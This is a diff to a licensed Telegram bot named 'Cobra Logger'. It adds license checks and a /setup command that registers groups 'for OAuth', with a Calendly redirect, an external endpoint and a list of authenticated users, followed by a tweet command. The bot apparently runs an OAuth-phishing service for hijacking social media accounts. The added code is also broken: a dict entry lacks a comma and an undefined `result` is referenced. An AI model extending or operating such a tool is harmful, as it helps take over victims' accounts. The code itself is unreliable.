@@ -42,7 +42,7 @@ def generate_random_key(length=12, segment_length=4):
 async def check_license(user_id, chat_id, context):
     license = licenses.find_one({"used_by": user_id, "status": "active"})
     
-    text = "⚠️ *License not found or is expired. Please purchase a license to continue using Cobra Logger.*"
+    text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
     
     if not license:
         await context.bot.send_message(chat_id, text, parse_mode) 
@@ -73,6 +73,12 @@ async def start(update: Update, context: CallbackContext) -> None:
     
     user_id = update.effective_user.id
     username = update.effective_user.username
+    
+    if licenses.find_one({"used_by": user_id}):
+        text="⚠️ *A license is already active on your account.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode)
+        return
         
     user_data = {
         "user_id": user_id,
@@ -93,7 +99,7 @@ async def start(update: Update, context: CallbackContext) -> None:
         expiration_date = license.get("expiration_date")
         expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Never"
         
-        text = f"🐍 *Welcome to Cobra Logger, {update.effective_user.full_name}*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_date}`\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth._"
+        text = f"🐍 *Welcome to Cobra Logger, {update.effective_user.full_name}*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the /setup command to setup your group for OAuth._"
         await context.bot.send_message(chat_id, text, parse_mode)
     else:
         text = "⚠️ *An unknown error occured.*"
@@ -122,12 +128,37 @@ async def setup(update: Update, context: CallbackContext) -> None:
     owner_id = update.message.from_user.id
     owner_username = update.message.from_user.username
     group_name = update.message.chat.title
+    identifier = str(uuid.uuid4())
     
     license = await check_license(user_id=owner_id, chat_id=chat_id, context=context)
     if license:
-        text = "Setting up..."
-        await context.bot.send_message(chat_id, text, parse_mode)
+        group_data = {
+            "group_id": chat_id,
+            "group_name": group_name,
+            "owner_id": owner_id,
+            "owner_username": owner_username,
+            "identifier": identifier,
+            "redirect": "https://calendly.com/cointele"
+            "endpoint": f"https://cobratool.dev?",
+            "authenticated_users": []
+        }
+        groups.insert_one(group_data)
         
+        user_data = {
+            "group_id": chat_id
+        }
+        users.update_one(
+            {"user_id": owner_id},
+            {"$set": user_data}
+        )
+        
+        if result.modified_count > 0:
+            text = f"✅ *Group has been set up for OAuth.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* `{group_data['group_id']}`\n┣  *Group Name:* `{group_data['group_name']}`\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* `{group_data['identifier']}`"
+            await context.bot.send_message(chat_id, text, parse_mode)
+        else:
+            text = "⚠️ *An unknown error occured.*"
+            await context.bot.send_message(chat_id, text, parse_mode)
+
 
 async def tweet(update: Update, context: CallbackContext) -> None:
     args = context.args
